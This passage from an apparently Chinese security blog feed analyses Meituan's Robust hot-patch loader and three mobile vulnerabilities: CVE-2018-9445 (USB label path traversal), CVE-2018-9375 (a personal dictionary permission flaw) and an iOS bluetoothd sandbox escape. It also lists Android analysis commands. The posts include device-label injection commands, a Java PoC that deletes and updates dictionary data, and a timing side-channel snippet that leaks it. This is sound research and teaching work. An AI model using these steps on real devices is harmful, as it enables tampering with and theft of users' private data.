p : patches) { if (p.isAppliedSuccess()) { Log.d(&quot;robust&quot;, &quot;p.isAppliedSuccess() skip &quot; + p.getLocalPath()); continue; } if (patchManipulate.ensurePatchExist(p)) { boolean currentPatchResult = false; try { //真正应用补丁的方法patch() currentPatchResult = patch(context, p); } catch (Throwable t) { robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor method:applyPatchList line:69&quot;); } if (currentPatchResult) { //设置patch 状态为成功 p.setAppliedSuccess(true); //统计PATCH成功率 PATCH成功 robustCallBack.onPatchApplied(true, p); } else { //统计PATCH成功率 PATCH失败 robustCallBack.onPatchApplied(false, p); } Log.d(&quot;robust&quot;, &quot;patch LocalPath:&quot; + p.getLocalPath() + &quot;,apply result &quot; + currentPatchResult); } } }12跟踪patch()函数的实现： protected boolean patch(Context context, Patch patch) { //验证patch的hash if (!patchManipulate.verifyPatch(context, patch)) { return false; } //调用DexClassLoader动态加载dex DexClassLoader classLoader = new DexClassLoader(patch.getTempPath(), context.getCacheDir().getAbsolutePath(),null, PatchExecutor.class.getClassLoader()); patch.delete(patch.getTempPath()); Class patchClass, oldClass; Class patchsInfoClass; PatchesInfo patchesInfo = null; //动态加载PatchesInfoImpl，获取要patch的类,之前介绍过PatchesInfoImpl.java中保存了所有要patch的类以及映射 try { patchsInfoClass = classLoader.loadClass(patch.getPatchesInfoImplClassFullName()); patchesInfo = (PatchesInfo) patchsInfoClass.newInstance(); } catch (Throwable t) { Log.e(&quot;robust&quot;, &quot;PatchsInfoImpl failed,cause of&quot; + t.toString()); t.printStackTrace(); } //调用PatchesInfoImpl的getPatchedClassesInfo，返回一个List List&lt;PatchedClassInfo&gt; patchedClasses = patchesInfo.getPatchedClassesInfo(); //循环类名，将patchedClasses中的类打补丁 for (PatchedClassInfo patchedClassInfo : patchedClasses) { String patchedClassName = patchedClassInfo.patchedClassName;//修改前的类名,即oldclass String patchClassName = patchedClassInfo.patchClassName;//修改后的类名Control //将oldClass的changeQuickRedirectField的值设置为patchObject的实例。 try { oldClass = classLoader.loadClass(patchedClassName.trim()); Field[] fields = oldClass.getDeclaredFields(); //遍历Fields找到changeQuickRedirect Field changeQuickRedirectField = null; for (Field field : fields) { if (TextUtils.equals(field.getType().getCanonicalName(), ChangeQuickRedirect.class.getCanonicalName()) &amp;&amp; TextUtils.equals(field.getDeclaringClass().getCanonicalName(), oldClass.getCanonicalName())) { changeQuickRedirectField = field; break; } } try { //加载补丁类 patchClass = classLoader.loadClass(patchClassName); Object patchObject = patchClass.newInstance(); changeQuickRedirectField.setAccessible(true); //将原类的changeQuickRedirectField设置为patchObject实例，即补丁类 changeQuickRedirectField.set(null, patchObject); } catch (Throwable t) { Log.e(&quot;robust&quot;, &quot;patch failed! &quot;); } } catch (Throwable t) { Log.e(&quot;robust&quot;, &quot;patch failed! &quot;); } } Log.d(&quot;robust&quot;, &quot;patch finished &quot;); return true; } 1234567上述代码去掉了部分log信息，对关键的处理已经标注了注释，不难看出patch通过classLoader加载了原类和补丁Control类，并遍历原类中的Field找到changeQuickRedirect，将其赋值为一个补丁类的对象。（由于补丁Control类实现了changeQuickRedirect接口，因此可以直接赋值）。由于在编译阶段生成的代码中，如果原类的changeQuickRedirect值不为空，就执行补丁逻辑，所以经过这部分代码后，原类的changeQuickRedirect变成一个补丁类的对象。### 调用补丁由编译阶段可知补丁的调用代码为： if(changeQuickRedirect != null) { if(PatchProxy.isSupport(new Object[0], this, changeQuickRedirect, false)) { return ((Long)PatchProxy.accessDispatch(new Object[0], this, changeQuickRedirect, false)).longValue(); } } 1我们看看源码中的PatchProxy中的isSupport()的实现： public static boolean isSupport(Object[] paramsArray, Object current, ChangeQuickRedirect changeQuickRedirect, boolean isStatic, int methodNumber, Class[] paramsClassTypes, Class returnType) { //获取 classMethod = className + “:” + methodName + “:” + isStatic + “:” + methodNumber; String classMethod = getClassMethod(isStatic, methodNumber); Object[] objects = getObjects(paramsArray, current, isStatic); try { //调用changeQuickRedirect.isSupport return changeQuickRedirect.isSupport(classMethod, objects); } catch (Throwable t) { return false; } } 1234567PatchProxy中的isSupport()会调用changeQuickRedirect中的isSupport()，也就是补丁类中的isSupport()：![upload successful](/images/pasted-121.png)由于arg5是“className:methodName:isStatic:methodNumber”格式，上述isSupport()相当于return “:22:”.contains(methodNumber)。接着，我们看一下accessDispatch的实现： public static Object accessDispatch(Object[] paramsArray, Object current, ChangeQuickRedirect changeQuickRedirect, boolean isStatic, int methodNumber, Class[] paramsClassTypes, Class returnType) { //同样获取 classMethod = className + &quot;:&quot; + methodName + &quot;:&quot; + isStatic + &quot;:&quot; + methodNumber; String classMethod = getClassMethod(isStatic, methodNumber); if (TextUtils.isEmpty(classMethod)) { return null; } Object[] objects = getObjects(paramsArray, current, isStatic); //调用changeQuickRedirect.accessDispatch。 return changeQuickRedirect.accessDispatch(classMethod, objects); } 1234567891011121314151617181920PatchProxy.accessDispatch调用changeQuickRedirect.accessDispatch：![upload successful](/images/pasted-122.png)先判断函数是否为static函数，再获取函数的参数列表，根据methodNumber，选取要执行的patch方法去执行。此时，便完成了补丁的执行。## Robust总结1. Robust的优缺点 - 优点兼容性高，开发透明；实时生效。 - 缺点每个方法都会增加一段代码，会增大发布包的体积；每个方法都有一个判断，影响运行效率；2. 寻找robust热补丁的位置 1. 查找PatchManipulateImp类或其派生类，其中setLocalPath一般为原始补丁路径，setTempPath为解密后的补丁路径，一般解密后就会删除；fetchPatchList函数为获取补丁的逻辑，verifyPatch函数为补丁校验逻辑； 2. Hook dexclassLoader的构造函数,dex路径为其参数 var dexclassLoader = Java.use(&quot;dalvik.system.DexClassLoader&quot;); //hook 构造函数$init dexclassLoader.$init.implementation = function(dexPath,optimizedDirectory,librarySearchPath,parent){ console.log(&quot;=====================\n&quot;) console.log(&quot;dexPath: &quot;+dexPath); console.log(&quot;optimizedDirectory: &quot;+optimizedDirectory); console.log(&quot;librarySearchPath: &quot;+librarySearchPath); console.log(&quot;parent: &quot;+parent); this.$init(dexPath,optimizedDirectory,librarySearchPath,parent); } ``` 参考资料： https://github.com/Meituan-Dianping/Robust/blob/master/README-zh.md https://bbs.pediy.com/thread-229597.htm]]></content>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-9445 —— Android挂载外设的目录穿越]]></title>
    <url>%2F2018%2F08%2F14%2FCVE-2018-9445-%E2%80%94%E2%80%94-Android-USB%E4%B8%8A%E7%9A%84%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%2F</url>
    <content type="text"><![CDATA[简介Android的USB有host和Accessory两种模式，处于Host模式下的Android设备可以对外围设备进行交互，如读取U盘数据、USB键盘鼠标等。当有外设插入到Android设备上时，系统读取外设的一些硬件信息（如LABEL、UUID等）并自动为其挂载。 常见的USB设备有以下几种： USB Sticks即U盘，用于手机和U盘之间拷贝数据，即使处于锁屏状态，系统也会自动mount。（Android 9之后，系统阻止了锁屏情况下的mount） USB keyboardsUSB键盘或鼠标，可以用来操控手机，在锁屏下也会自动mount。 USB ethernet adaptersUSB网卡，插入手机后，通过DHCP可以获取ip地址联通网络，锁屏下也可以使用 Android系统中由Vold进程（Volume Daemon）负责管理和控制外设，Vold进程如果在挂载外设时没有正确的对硬件信息进行解析，则有可能出现安全问题。CVE-2018-9445就是Vold在挂载外设时，由于未正确获取UUID导致的目录穿越问题。 漏洞细节当USB设备插到Android手机上时，Vold进程（Volume Daemon）会自动为USB设备进行mount，即使手机处于锁屏状态。Vold进程在mount之前需要知道所连接设备的一些硬件信息，如UUID、type、Label等，其具体实现在system/vold/Utils.cpp的readMetadata()函数中： 12345678910111213141516171819202122232425262728293031323334353637383940414243/*https://android.googlesource.com/platform/system/vold/+/master/Utils.cpp#212*/std::vector&lt;std::string&gt; cmd; cmd.push_back(kBlkidPath); cmd.push_back(&quot;-c&quot;); cmd.push_back(&quot;/dev/null&quot;); cmd.push_back(&quot;-s&quot;); cmd.push_back(&quot;TYPE&quot;); cmd.push_back(&quot;-s&quot;); cmd.push_back(&quot;UUID&quot;); cmd.push_back(&quot;-s&quot;); cmd.push_back(&quot;LABEL&quot;); cmd.push_back(path); std::vector&lt;std::string&gt; output; status_t res = ForkExecvp(cmd, output, untrusted ? sBlkidUntrustedContext : sBlkidContext); if (res != OK) &#123; LOG(WARNING) &lt;&lt; &quot;blkid failed to identify &quot; &lt;&lt; path; return res; &#125; char value[128]; for (const auto&amp; line : output) &#123; // Extract values from blkid output, if defined const char* cline = line.c_str(); const char* start = strstr(cline, &quot;TYPE=&quot;); //读取127个字符，遇到引号停止 if (start != nullptr &amp;&amp; sscanf(start + 5, &quot;\&quot;%127[^\&quot;]\&quot;&quot;, value) == 1) &#123; fsType = value; &#125; start = strstr(cline, &quot;UUID=&quot;); if (start != nullptr &amp;&amp; sscanf(start + 5, &quot;\&quot;%127[^\&quot;]\&quot;&quot;, value) == 1) &#123; fsUuid = value; &#125; start = strstr(cline, &quot;LABEL=&quot;); if (start != nullptr &amp;&amp; sscanf(start + 6, &quot;\&quot;%127[^\&quot;]\&quot;&quot;, value) == 1) &#123; fsLabel = value; &#125; &#125; 该函数通过调用了blkid命令，从结果中依次按行读取字符串分别对TYPE、UUID和LABEL进行解析。在Android中运行blkid命令（需要root权限）结果如下图： 默认情况下，Android系统将USB设备mount在/mnt/media_rw/目录下，且以UUID为文件名，例如： 通常情况下UUID字段不会包含特殊字符，因为它是blkid经过格式化输出的二进制字符串，TYPE字段是固定的几种文件系统格式类型，如fat、ext、ntfs等，而LABEL字段可以自定义，该字段即外设的名称，允许用户自定义。 需要注意的是Android上运行blkid后会首先输出LABEL，通过构造特殊的LABEL,我们可以实现注入攻击: 根据readMetadata()函数的代码，UUID由运行”blkid -c /dev/null -s TYPE -s UUID -s LABEL”后的结果解析得出，因此，如果设备的LABEL的值为“aaa UUID=”../../sdcard””,运行上述命令后，结果为：1LABEL=&quot;aaa UUID=&quot;../../sdcard&quot;&quot; UUID=&quot;4823-0029&quot; TYPE=&quot;vfat&quot; 此时被sscanf解析后的UUID值变成了“../../sdcard”，被系统mount后就会创建/mnt/media_rw/../../sdcard目录，导致了目录穿越。 漏洞利用直接在操作系统中更改USB外设的LABEL值相当于修改文件名，在操作系统中修改文件名为包含“../”的字符串是不可行的，我们需要通过文件系统进行修改。 由于romfs文件格式比较简单(如下图)，我们直接使用echo就可以对其LABEL值进行修改， 修改LABEL(上图中的volume name字段)值为TYPE=”vfat” UUID=”../../data”1echo &apos;-rom1fs-########TYPE=&quot;vfat&quot; UUID=&quot;../../data&quot;&apos; &gt; /dev/block/sda1 更改后，运行blkid命令： 插入修改后的设备后，发现并没有mount成功。查看logcat，发现UUID确实会被识别为“../../data”，但fsck_msdos出现了错误 这是因为虽然我们提供的type为vfat，但内核在读取文件头部时，获取的文件格式为romfs。而fsck_msdos是用来处理vfat格式，因此出现了错误。 为了不产生fsck_msdos错误，我们创建一个文件格式为vfat，LABEL为自定义的真实USB设备： 修改USB设备文件格式为vfat，设置label为AAAAAAAAAAA(经测试vfat的label最多为11个字符，超过11个将会自动截断) 1mkfs.vfat -n &apos;AAAAAAAAAAA&apos; /dev/block/sda1 通过dd命令查找AAAAAAAAAAA字符串并替换为’UUID=”../aa’（替换后的字符长度必须和之前相同，UUID=”../aa为11个字符） 1dd if=/dev/block/sda1 bs=1M count=200 | sed &apos;s|AAAAAAAAAAA|UUID=&quot;../aa|g&apos; | dd of=/dev/block/sda1 bs=1M 插入修改后的usb设备，我们可以看到/mnt/目录下多了aa文件 运行mount|grep aa进一步验证： 上述过程完成了漏洞的验证，但局限在于vfat的LABEL最多只有11个字符，由于UUID=”本身占用了6个字符，只剩下5个字符可以控制。这意味着我们只能向上穿越一层，且mount后的目录只有2个字符。考虑到romfs格式的LABEL允许更大的长度（romfs格式中的LABEL字段遇到\0才会结束），因此，为了实现更大的攻击，需要在USB协议上进行攻击： 即实现一个USB硬件，使系统读取blkfs时外设获取的为romfs格式，mount操作时外设告知系统自己为vfat格式。（vfat为了保证外设可以被mount为外部存储设备，romfs为了保证LABEL有足够长进而可以穿越到其他路径） 漏洞原作者使用树莓派开启USB模式作为一个USB硬件，实现了从Pixel 2设备中窃取照片的PoC（https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/45192.zip)，这个PoC假设了一种场景，即存在一个app在收到外设mount事件后会自动把本机照片写入外设。为实现该场景，需要修改AOSP源码编译到Pixel设备，新增了部分代码实现一个MountReceiver，在收到mount事件后自动将DCIM目录下的照片复制到data/exfiltrate-photo目录。利用漏洞构造一个USB外设使外设被mount到/data目录，进而实现照片文件的窃取。 漏洞修复CVE-2018-9445这个漏洞出现的根本原因有2个： Vold进程在获取TYPE、UUID和LABEL时，使用不严格的字符串匹配方式来读取内容； Android系统中的blkid并未按照期待的顺序（TYPE、UUID和LABEL）输出，而是最先输出可自定义的LABEL值； 结合了上述两个问题，最终导致了mount时的目录穿越。 漏洞修复时也是针对这2点分别进行了修复： 在blkid的输出内容里过滤掉了引号 使用strstr是增加了对引号的匹配 总结CVE-2018-9445是一个典型的字符串注入攻击，一般的注入漏洞常常发生在exec的参数中，即命令注入，这个漏洞虽然也和exec有关，但是由exec的结果导致下游解析出现了目录穿越。关注解析字符串的代码和exec相关的代码，可能还会有其他的问题。 参考： https://bugs.chromium.org/p/project-zero/issues/detail?id=1583 https://www.exploit-db.com/exploits/45192/]]></content>
  </entry>
  <entry>
    <title><![CDATA[cve-2018-9375 —— Android Personal Dictionary漏洞分析]]></title>
    <url>%2F2018%2F08%2F13%2Fcve-2018-9375-%E2%80%94%E2%80%94-Android%E4%B8%AA%E4%BA%BA%E5%AD%97%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[关于Personal Dictionary（个人字典）Personal Dictionary（个人字典）是Android系统提供的一个自定义的字典，用于存放用户经常输入的数据或字符以提高输入效率，它位于“设置”—— “语言和输入法” —— “个人字典”中，某些情况下Personal Dictionary中可能存放用户的隐私信息，如密码、地址、电话、信用卡账号等信息。https://ioactive.com/wp-content/uploads/2018/07/exploit-user-dictionary-poc.png 用户也可以为一个字符串自定义一个shortcut，例如输入myhome，会自动出来详细的地址https://ioactive.com/wp-content/uploads/2018/07/exploit-user-dictionary-poc2.png 在Andorid系统内部，这些字符保存在一个sqlite数据库中，表名称为“words”，其中包含6个列：_id (INTEGER, PRIMARY KEY)word (TEXT)frequency (INTEGER)locale (TEXT)appid (INTEGER)shortcut (TEXT) 漏洞细节早期版本的Android系统中，操作Personal Dictionary需要申请权限：android.permission.READ_USER_DICTIONARYandroid.permission.WRITE_USER_DICTIONARY从Android 6.0（API 23）开始, Android规定只有IME和spellchecker才可以操作Personal Dictionary，并提供了对应的provider —— content://user_dictionary/words com.android.providers.userdictionary.UserDictionaryProvider实现了对Personal Dictionary增删查改，canCallerAccessUserDictionary（）函数进行权限检查，参考：https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/master/src/com/android/providers/userdictionary/UserDictionaryProvider.java 然后在实现delete和update函数时，一个奇葩的错误出现了，代码会先完成删除或更新操作，最后在检查权限，那么就造成了任何进程都可以进行delete和update操作了。 存在漏洞的delete实现： 存在漏洞的update实现： 此外，检查AndroidMefest.xml文件发现对UserDictionaryProvider的访问也没有任何限制 ![upload successful](/images/pasted-103.png 因此，本地恶意应用利用该漏洞可以任意delete和update用户的Personal Dictionary了。 PoC123456ContentValues values = new ContentValues();values.put(UserDictionary.Words.WORD, &quot;m4bln&quot;);//更新getContentResolver().update(UserDictionary.Words.CONTENT_URI, values,null, null);//删除getContentResolver().delete(UserDictionary.Words.CONTENT_URI, null, null); 利用侧信道进一步利用上述漏洞仅能实现更新和删除Personal Dictionary，造成的影响有限，但如果能读取的话就比较严重了。 由于where参数可以完全被攻击者控制，并且成功执行更新操作的语句与不执行任何操作的同一语句相比用时更长，所以可以利用侧信道的方式来猜测Personal Dictionary。 例如,当数据库中存在以“a”开头的数据时，运行如下代码200次得出的时间会比没有“a”开头的数据要短，123456789ContentValues values = new ContentValues();values.put(UserDictionary.Words._ID, 1);long t0 = System.nanoTime();for (int i=0; i&lt;200; i++) &#123; getContentResolver().update(UserDictionary.Words.CONTENT_URI, values, &quot;_id = 1 AND word LIKE &apos;a%&apos;&quot;, null);&#125;long t1 = System.nanoTime(); 因此，利用基于时间差的方法，可以依次猜测出第二个、第三个字符，直至猜到所有字符。 漏洞作者提供了Exploit: https://github.com/IOActive/AOSP-ExploitUserDictionary 漏洞修复修复当然很简单，把权限检查放到开头就行了。这个漏洞的出现确实很奇葩，query、insert等函数的实现都是先check权限后操作，唯独delete和update存在漏洞，而且据作者描述，该漏洞存在了3年都没人发现！！！看来阅读和理解源代码确实需要一番功夫。 参考： https://ioactive.com/discovering-and-exploiting-a-vulnerability-in-androids-personal-dictionary/ https://github.com/IOActive/AOSP-ExploitUserDictionary https://developer.android.com/reference/android/provider/UserDictionary https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/cccf7d5c98fc81ff4483f921fb4ebfa974add9c6%5E%21/#F0]]></content>
  </entry>
  <entry>
    <title><![CDATA[利用蓝牙callback逃逸iOS沙箱]]></title>
    <url>%2F2018%2F08%2F10%2F%E5%88%A9%E7%94%A8%E8%93%9D%E7%89%99%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8iOS%E6%B2%99%E7%AE%B1%2F</url>
    <content type="text"><![CDATA[iOS的Sandbox和IPC机制iOS的sandbox限制了普通的应用程序只能访问自身沙箱内的资源，应用程序在进行系统调用时会受到sandbox的策略限制。因此，为了实现权限提升，逃逸iOS的sandbox是必要的。 iOS系统提供了IPC机制（进程间通信），如URL schemes, Mach, pipes等，Mach IPC是一套面向消息的IPC机制，实现对象与对象之间的通信，源对象发送一条消息，这条消息加入到目标对象的队列中等待处理。如果产生应答，则通过另一条消息传递回去。消息分简单消息和复杂消息，分别对应两种不同的结构： 简单消息 复杂消息 Mach对象之间的消息时基于端口传递的，消息从某一个端口发送到另一个端口。向一个端口发送消息实际上是将消息放在队列中，直到消息被处理。查找一个对象的句柄(标识应用程序中的不同对象和同类中的不同的实例的值)，实际上查找的是这个对象端口的句柄，给定一个对象的端口，就可以通信了。Mach消息传递使用的是Mach_msg()函数。 基于Mach的消息机制，iOS又提供了XPC、NSXPC等进程间通信机制，通过这些机制，sandbox内的应用可以和没有sandbox的Mach service进行通信，如果这些service在处理消息时发生错误，就有可能出现由sandbox到非sandbox的代码执行。 为了发现这些问题，我们将目标放在Mach service的消息处理上，那么如何找到实现Mach service的binary文件呢？ /System/Library/LaunchDaemons的plist文件包含了大多数Mach service，其中MachServices字段指向了一组Mach services,ProgramArguments字段指向实现这些Mach service的binary文件。 CVE-2018-4087—— 利用bluetoothd绕过sandboxcom.apple.server.bluetooth是众多Mach service的其中一个，它由bluetoothd来实现，并通过Mach消息机制与普通的应用程序进行通信。 bluetoothd启动一个端口并在该端口接收队列的消息，其处理逻辑由apple_bluetoothd_mig_server函数实现， apple_bluetoothd_mig_server根据接收到的消息的msgid执行不同的callback函数，漏洞作者给所有的callback函数加上了符号，如下图： mach__BTLocalDeviceAddCallbacks是msgid为3时对应的callback，它主要实现注册一个回调函数的功能，回调函数的地址由消息的发送方给出。当触发相应的事件时，控制流即走向了回调函数。 理论上讲，当一个对象与bluetoothd建立连接时，需要产生一个session token, bluetoothd根据这个token来判断收到的消息是不是来自这个对象。但是bluetoothd的session token值为mach_port_t类型，意味着这个值是很容易爆破的（0x0000 -0xFFFF）。 获得session后就挟持其他对象和bluetoothd的通信了，结合上述注册回调函数的功能，不难看出，我们可以冒充其他对象注册回调函数，即控制代码由bluetoothd走到一个任意回调函数，从汇编角度讲，我们通过挟持其他对象和bluetoothd的通信控制了PC。 为了实现sandbox逃逸，这个回调函数地址应该位于一个unsandbox进程中，作者给出了所有在bluetoothd上注册callback的unsandbox进程：SpringBoardmDNSResponderaggregatedwifidPreferencesCommCenteriaptransportdfindmydevicedroutinedUserEventAgentcarkitdmediaserverdbluetoothdcoreduetd [引文1]（https://weibo.com/ttarticle/p/show?id=2309404271293301154324#_0）中给出了两幅图很形象的展示了这个攻击过程： 作者提供的PoC:https://github.com/rani-i/bluetoothdPoC/blob/master/bluetoothdPoC/main.m 该漏洞在iOS – 11.2.5上完成修复。 再次发现bluetoothd漏洞并利用iOS 11.2.5修复了上述漏洞，通过增加了一个随机的user_id字段作为鉴别通信的依据。如下图所示： 然而，研究人员通过分析，又发现两个新的0day。bluetoothd中的BTAccessoryManagerAddCallbacks()并没有实现user_id验证机制，这意味着依然可以使用上述漏洞。 但是BTAccessoryManagerAddCallbacks只有在蓝牙连接到一个新设备上时才会触发，研究人员又发现了在蓝牙扫描程序中的一个新bug,一个sandbox应用可以通过BTDiscoveryAgentCreate()创建一个扫描代理，并通过BTDiscoveryAgentStartScan() 去触发BTAccessoryManagerAddCallbacks事件。 这两个漏洞（CVE-2018-4330 and CVE-2018-4327）在iOS 11.4.1中被修复。 漏洞的进一步利用从控制PC到ROP利用上述漏洞仅仅能控制PC，为了实现RCE我们需要进一步布局，这里利用了ROP和堆喷射。作者提到使用了MACH_MSGH_BITS_COMPLEX 和 MACH_MSG_OOL_DESCRIPTOR Mach消息实现了堆喷，如果发送这类消息没有收到任何回复，则消息内容将会留存在目标进程的内存空间。 为了挟持程序流，我们还需要操纵栈寄存器，即实现stack pivot。 作者在libsystem_platform.dylib发现一条ROP链，通过控制了X0寄存器进而达到了控制SP。 从ROP到task port在iOS中，一个进程的task port可以被用来控制该进程的内存和寄存器，task port通过mach_task_self()来获取，第三方进程可以通过这个task port去操纵目标进程，例如：mach_vm_allocate(target_task_port, &amp;remote_addr, remote_size, 1) 可以在目标进程中分配内存，mach_vm_write(target_task_port, remote_address, local_address, length)可以向目标进程中写入数据。 因此，unsandbox进程被控制后，将其task port发送给sandbox进程，sandbox进程进而实现了完全控制。具体实现如下：pwn app使用mach_port_allocate()分配0x1000个port,并使用mach_port_insert_right() 在这些port中插入send right,之后通过MACH_MSG_PORT_DESCRIPTOR类型的OOL 消息发送到目标进程。下一步通过堆喷和ROP对内存布局，触发漏洞后控制PC,目标进程将task port返回给pwn app。 整个过程如下图： 遗憾的是，iOS 11限制了sandbox进程对task port的访问，这种方法已经不再适用。 另一种方案即使不能用task port，利用ROP已经实现了代码执行,再寻找其他的garget实现任意函数调用。 这里作者并没有细说，期待更多的技术细节。 参考： https://weibo.com/ttarticle/p/show?id=2309404271293301154324#_0: Escaping sandbox using callbacks) Hack in the (sand)Box Mach消息发送机制 Mining_Mach_Services_within_OS_X_Sandbox]]></content>
  </entry>
  <entry>
    <title><![CDATA[Android分析常用的工具或命令]]></title>
    <url>%2F2018%2F08%2F02%2Fndroid%E5%88%86%E6%9E%90%E5%B8%B8%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%88%96%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[dumpsysdumpsys命令用来查询界面元素层级、系统服务运行状态、电池、网络等一些信息。用法：12345678910HWVTR:/ # dumpsys --helpusage: dumpsys To dump all services.or: dumpsys [-t TIMEOUT] [--help | -l | --skip SERVICES | SERVICE [ARGS]] --help: shows this help -l: only list services, do not dump them -t TIMEOUT: TIMEOUT to use in seconds instead of default 10 seconds --skip SERVICES: dumps all services but SERVICES (comma-separated list) SERVICE [ARGS]: dumps only service SERVICE, optionally passing ARGS to it 常用功能： dumpsys activity activities | grep mResumedActivity 获取顶层activity dumpsys -l 列出所有运行的服务 dumpsys wifiscanner 获取wifi信息 dumpsys webviewupdate 获得webview版本等信息 dumpsys usagestats|grep com.tencent.mm 某个APP的使用情况 dumpsys shortcut 所有的shortcut dumpsys package -h 所有和package相关 dumpsys ethernet 屏幕信息 dumpsys battery 电池状态 dumpsys BastetService DNS信息 参考：https://developer.android.com/studio/command-line/dumpsys lsoflsof命令用于查看进程开打的文件，打开文件的进程，进程打开的端口(TCP、UDP)。lsof必须以root运行。123456789101112-a：列出打开文件存在的进程；-c&lt;进程名&gt;：列出指定进程所打开的文件；-g：列出GID号进程详情；-d&lt;文件号&gt;：列出占用该文件号的进程；+d&lt;目录&gt;：列出目录下被打开的文件；+D&lt;目录&gt;：递归列出目录下被打开的文件；-n&lt;目录&gt;：列出使用NFS的文件；-i&lt;条件&gt;：列出符合条件的进程。（4、6、协议、:端口、 @ip ）-p&lt;进程号&gt;：列出指定进程号所打开的文件；-u：列出UID号进程详情；-h：显示帮助信息；-v：显示版本信息。 Android 系统中的lsof不完全支持以上操作，需要安装busybox123456789OnePlus5T:/ # lsof --helpusage: lsof [-lt] [-p PID1,PID2,...] [NAME]...Lists open files. If names are given on the command line, onlythose files will be shown.-l list uids numerically-p for given comma-separated pids only (default all pids)-t terse (pid only) output lsof输出格式为： 常用到的命令： lsof -p [pid] 监控某个进程打开的文件 lsof [filename] 查找某个文件被谁打开 lsof -i似乎在android或busybox上不可用，配合grep使用,例如：lsof|grep “TCP :27042” /proc/proc是一种虚拟文件系统（/proc/xxx 文件本身的大小却会显示为0字节），存储的是当前内核运行状态的一系列特殊文件，可以通过这些文件查看有关系统硬件及当前正在运行进程的信息。 由于/proc目录下部分文件是可以被全局可读的，因此经常用来进行侧信道攻击。 如下为Android 7.1.1 OnePlus手机上的proc目录：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071dr-xr-xr-x 9 root root 0 2018-08-06 13:55 998... 略去大部分piddr-xr-xr-x 3 root root 0 2018-08-06 12:05 asounddr-xr-xr-x 2 root root 0 2018-08-07 11:45 ath_pktlog-r--r--r-- 1 root root 0 2018-08-07 11:45 bootloader_log-r--r--r-- 1 root root 0 2018-08-07 11:45 buddyinfodr-xr-xr-x 4 root root 0 2018-08-07 11:45 bus-r--r--r-- 1 root root 0 2018-08-07 11:45 cgroupsdr-xr-xr-x 2 root root 0 2018-08-07 11:45 cld-r--r----- 1 root radio 0 2018-08-07 11:45 cmdline-r--r--r-- 1 root root 0 2018-08-07 11:45 consoles-r--r--r-- 1 root root 0 2018-08-07 11:45 cpuinfo-r--r--r-- 1 root root 0 2018-08-07 11:45 cryptodr-xr-xr-x 2 root root 0 2018-08-07 11:45 debugdr-xr-xr-x 2 root root 0 2018-08-07 11:45 debugdriverlrwxrwxrwx 1 root root 29 2018-08-07 11:45 device-tree -&gt; /sys/firmware/devicetree/base-r--r--r-- 1 root root 0 2018-08-07 11:45 devices-r--r--r-- 1 root root 0 2018-08-07 11:45 diskstatsdr-xr-xr-x 2 root root 0 2018-08-07 11:45 driver-r--r--r-- 1 root root 0 2018-08-07 11:45 execdomains-r--r--r-- 1 root root 0 2018-08-07 11:45 fb-r--r--r-- 1 root root 0 2018-08-07 11:45 filesystemsdr-xr-xr-x 5 root root 0 2018-08-07 11:45 fs-r--r--r-- 1 root root 0 2018-08-07 11:45 interrupts-r-------- 1 root root 0 2018-08-07 11:45 iomem-r--r--r-- 1 root root 0 2018-08-07 11:45 ioportsdr-xr-xr-x 223 root root 0 2018-08-07 11:45 irq-r--r--r-- 1 root root 0 2018-08-07 11:45 kallsyms-r--r--r-- 1 root root 0 2018-08-07 11:45 key-users-r--r--r-- 1 root root 0 2018-08-07 11:45 keys-r--r----- 1 root system 0 1970-09-03 05:58 kmsg-r-------- 1 root root 0 2018-08-07 11:45 kpagecount-r-------- 1 root root 0 2018-08-07 11:45 kpageflags-r--r--r-- 1 root root 0 2018-08-07 11:45 loadavg-r--r--r-- 1 root root 0 2018-08-07 11:45 locks-r--r--r-- 1 root root 0 2018-08-07 11:45 mdstat-r--r--r-- 1 root root 0 2018-08-07 11:45 meminfo-r--r--r-- 1 root root 0 2018-08-07 11:45 misc-r--r--r-- 1 root root 0 2018-08-07 11:45 moduleslrwxrwxrwx 1 root root 11 2018-08-07 11:45 mounts -&gt; self/mountslrwxrwxrwx 1 root root 8 2018-08-07 11:45 net -&gt; self/net-rw-rw-rw- 1 root root 0 2018-08-07 11:45 network_info-rw-rw-rw- 1 root root 0 2018-08-07 11:45 otrace_on-r--r--r-- 1 root root 0 2018-08-07 11:45 pagetypeinfo-r--r--r-- 1 root root 0 2018-08-07 11:45 partitions-r--r--r-- 1 root root 0 2018-08-07 11:45 proc_state-r--r--r-- 1 root root 0 2018-08-07 11:45 proc_transaction_log-r--r--r-- 1 root root 0 2018-08-07 11:45 proc_transactions-rw-r--r-- 1 root root 0 2018-08-07 11:45 restart_level_all-rw-rw-rw- 1 root root 0 2018-08-07 11:45 rf_cable_config-r--r--r-- 1 root root 0 2018-08-07 11:45 schedstatdr-xr-xr-x 3 root root 0 2018-08-07 11:45 scsilrwxrwxrwx 1 root root 0 1970-01-01 08:00 self -&gt; 15165-rw-r--r-- 1 system system 0 2018-08-07 11:45 ship_mode-r--r--r-- 1 root root 0 2018-08-07 11:45 softirqs-r--r--r-- 1 root root 0 2018-08-07 11:45 stat-r--r--r-- 1 root root 0 2018-08-07 11:45 swapsdr-xr-xr-x 1 root root 0 1970-09-03 05:57 sys--w--w---- 1 root system 0 2018-08-07 11:45 sysrq-triggerlrwxrwxrwx 1 root root 0 1970-01-01 08:00 thread-self -&gt; 15165/task/15165-r--r--r-- 1 root root 0 2018-08-07 11:45 timer_list-rw-r--r-- 1 root root 0 2018-08-07 11:45 timer_statsdr-xr-xr-x 2 root root 0 2018-08-07 11:45 touchpaneldr-xr-xr-x 4 root root 0 2018-08-07 11:45 ttydr-xr-xr-x 2 root root 0 2018-08-07 11:45 tzdbgdr-xr-xr-x 2 root root 0 2018-08-07 11:45 uid_cputime-r--r--r-- 1 root root 0 2018-08-07 11:45 uptime-r--r--r-- 1 root root 0 2018-08-07 11:45 version-r--r----- 1 root log 0 2018-08-07 11:45 